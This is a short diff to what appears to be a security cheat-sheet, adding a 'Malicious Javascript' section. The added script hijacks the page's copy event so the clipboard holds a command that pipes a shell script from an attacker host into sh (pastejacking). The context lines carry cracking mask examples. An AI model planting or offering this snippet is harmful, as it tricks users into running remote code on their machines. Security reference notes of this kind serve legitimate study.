@@ -207,3 +207,11 @@ dict1.txt dict2.txt
 dict.txt ?a?a?a?a
 ?a?a?a?a dict.txt
 ```
+
+# Malicious Javascript
+
+```
+<script>
+document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
+ </script>
+ ```
